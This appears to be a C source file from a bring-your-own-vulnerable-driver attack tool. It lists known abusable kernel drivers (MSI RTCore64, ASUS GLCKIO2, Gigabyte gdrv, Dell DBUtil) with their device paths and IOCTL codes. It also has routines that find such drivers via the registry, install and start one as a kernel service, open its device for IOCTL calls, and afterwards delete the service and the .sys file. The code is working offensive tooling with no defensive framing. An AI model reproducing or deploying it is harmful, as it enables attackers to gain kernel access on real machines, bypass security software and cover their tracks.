#include "driver_loader.h"

//
// Known vulnerable drivers database
// Each entry describes a driver that can be abused for kernel access.
//
static const VULNERABLE_DRIVER g_KnownDrivers[] = {
    {
        "RTCore64",
        "MSI Afterburner Core Driver",
        "\\\\.\\RTCore64",
        "RTCore64.sys",
        2,
        { 0x80002040, 0x80002044 }
    },
    {
        "GLCKIO2",
        "ASUS GLCKIO2 Driver",
        "\\\\.\\GLCKIO2",
        "GLCKIO2.sys",
        4,
        { 0x80102040, 0x80102044, 0x80102048, 0x8010204C }
    },
    {
        "gdrv",
        "Gigabyte Tools Driver",
        "\\\\.\\gdrv",
        "gdrv.sys",
        2,
        { 0xC3502500, 0xC3502504 }
    },
    {
        "DBUtil_2_3",
        "Dell DBUtil Driver",
        "\\\\.\\DBUtil_2_3",
        "DBUtil_2_3.sys",
        2,
        { 0x9C406000, 0x9C406004 }
    }
};

static const DWORD g_KnownDriverCount =
    sizeof(g_KnownDrivers) / sizeof(g_KnownDrivers[0]);

//
// Query the registry to check if a driver service exists and is running.
//
BOOL
IsDriverLoaded(
    _In_ PCSTR ServiceName
    )
{
    HKEY  hKey = NULL;
    CHAR  subKey[256];
    CHAR  startType[4];
    DWORD type = 0, size = sizeof(startType);
    BOOL  loaded = FALSE;

    (void)snprintf(subKey, sizeof(subKey),
        "SYSTEM\\CurrentControlSet\\Services\\%s", ServiceName);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0,
            KEY_READ, &hKey) != ERROR_SUCCESS)
    {
        return FALSE;
    }

    if (RegQueryValueExA(hKey, "Start", NULL, &type,
            (LPBYTE)startType, &size) == ERROR_SUCCESS)
    {
        //
        // Start = 1 (SERVICE_SYSTEM_START) or 0 (SERVICE_BOOT_START)
        // indicates driver is loaded at boot.
        //
        loaded = (startType[0] == 0 || startType[0] == 1);
    }

    RegCloseKey(hKey);
    return loaded;
}

//
// Scan the registry for known vulnerable driver services.
// Returns the list of drivers that are present on the system.
//
BOOL
FindVulnerableDriver(
    _Out_writes_(*Count) PVULNERABLE_DRIVER Drivers,
    _Inout_ PDWORD Count
    )
{
    DWORD found = 0;
    DWORD i     = 0;

    if (Drivers == NULL || Count == NULL) {
        return FALSE;
    }

    for (i = 0; i < g_KnownDriverCount && found < *Count; i++) {
        if (IsDriverLoaded(g_KnownDrivers[i].ServiceName)) {
            Drivers[found] = g_KnownDrivers[i];
            found++;
        }
    }

    *Count = found;
    return (found > 0);
}

//
// Load a vulnerable driver by creating + starting its service.
// The .sys file must already exist at SysFilePath.
//
BOOL
LoadVulnerableDriver(
    _In_ PCSTR DriverName,
    _In_ PCSTR SysFilePath,
    _Out_ PACTIVE_DRIVER Context
    )
{
    SC_HANDLE scm        = NULL;
    SC_HANDLE svc        = NULL;
    BOOL      result     = FALSE;
    DWORD     disposition = 0;
    CHAR      fullPath[MAX_PATH];

    if (DriverName == NULL || SysFilePath == NULL || Context == NULL) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    ZeroMemory(Context, sizeof(*Context));

    //
    // Ensure we have absolute path
    //
    if (GetFullPathNameA(SysFilePath, MAX_PATH, fullPath, NULL) == 0) {
        return FALSE;
    }

    //
    // Open SCM
    //
    scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (scm == NULL) {
        return FALSE;
    }
    Context->ScmHandle = scm;

    //
    // Create the service (or open if already exists)
    //
    svc = CreateServiceA(
        scm,
        DriverName,
        DriverName,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        fullPath,
        NULL, NULL, NULL, NULL, NULL
    );

    if (svc == NULL) {
        if (GetLastError() != ERROR_SERVICE_EXISTS &&
            GetLastError() != ERROR_DUPLICATE_SERVICE_NAME)
        {
            CloseServiceHandle(scm);
            Context->ScmHandle = NULL;
            return FALSE;
        }

        //
        // Service exists — open it
        //
        svc = OpenServiceA(scm, DriverName, SERVICE_ALL_ACCESS);
        if (svc == NULL) {
            CloseServiceHandle(scm);
            Context->ScmHandle = NULL;
            return FALSE;
        }
    }
    Context->ServiceHandle = svc;

    //
    // Start the driver
    //
    if (!StartServiceA(svc, 0, NULL)) {
        if (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
            goto cleanup;
        }
    }

    //
    // Get device handle for IOCTL communication
    //
    Context->DeviceHandle = GetDriverDeviceHandle(DriverName);
    if (Context->DeviceHandle == INVALID_HANDLE_VALUE) {
        //
        // Some drivers use a different device path; try common patterns
        //
        CHAR devicePath[64];
        (void)snprintf(devicePath, sizeof(devicePath), "\\\\.\\%s", DriverName);
        Context->DeviceHandle = CreateFileA(
            devicePath,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
    }

    //
    // Populate context
    //
    Context->DriverInfo = GetDriverInfo(DriverName);
    (void)strncpy(Context->SysFilePath, fullPath, MAX_PATH - 1);

    result = TRUE;

cleanup:
    if (!result) {
        if (Context->DeviceHandle != NULL &&
            Context->DeviceHandle != INVALID_HANDLE_VALUE)
        {
            CloseHandle(Context->DeviceHandle);
        }
        if (Context->ServiceHandle) {
            CloseServiceHandle(Context->ServiceHandle);
        }
        if (Context->ScmHandle) {
            CloseServiceHandle(Context->ScmHandle);
        }
        ZeroMemory(Context, sizeof(*Context));
    }

    return result;
}

//
// Open a handle to the driver's device for IOCTL communication.
// Returns INVALID_HANDLE_VALUE on failure.
//
HANDLE
GetDriverDeviceHandle(
    _In_ PCSTR DeviceName
    )
{
    CHAR devicePath[64];

    //
    // Try \\.\DeviceName format first
    //
    (void)snprintf(devicePath, sizeof(devicePath), "\\\\.\\%s", DeviceName);

    return CreateFileA(
        devicePath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
}

//
// Stop the driver service, delete it from SCM, and remove the .sys file.
//
BOOL
UnloadDriver(
    _Inout_ PACTIVE_DRIVER Context
    )
{
    SERVICE_STATUS status;
    BOOL           result = TRUE;

    if (Context == NULL) {
        return FALSE;
    }

    //
    // Close device handle
    //
    if (Context->DeviceHandle != NULL &&
        Context->DeviceHandle != INVALID_HANDLE_VALUE)
    {
        CloseHandle(Context->DeviceHandle);
        Context->DeviceHandle = NULL;
    }

    //
    // Stop the service
    //
    if (Context->ServiceHandle) {
        ControlService(Context->ServiceHandle, SERVICE_CONTROL_STOP, &status);
        DeleteService(Context->ServiceHandle);
        CloseServiceHandle(Context->ServiceHandle);
        Context->ServiceHandle = NULL;
    }

    if (Context->ScmHandle) {
        CloseServiceHandle(Context->ScmHandle);
        Context->ScmHandle = NULL;
    }

    //
    // Delete the .sys file from disk
    //
    if (Context->SysFilePath[0] != '\0') {
        DeleteFileA(Context->SysFilePath);
    }

    ZeroMemory(Context, sizeof(*Context));
    return result;
}

//
// Look up driver information by service name.
//
PVULNERABLE_DRIVER
GetDriverInfo(
    _In_ PCSTR DriverName
    )
{
    DWORD i;

    for (i = 0; i < g_KnownDriverCount; i++) {
        if (_stricmp(g_KnownDrivers[i].ServiceName, DriverName) == 0) {
            return (PVULNERABLE_DRIVER)&g_KnownDrivers[i];
        }
    }

    return NULL;
}
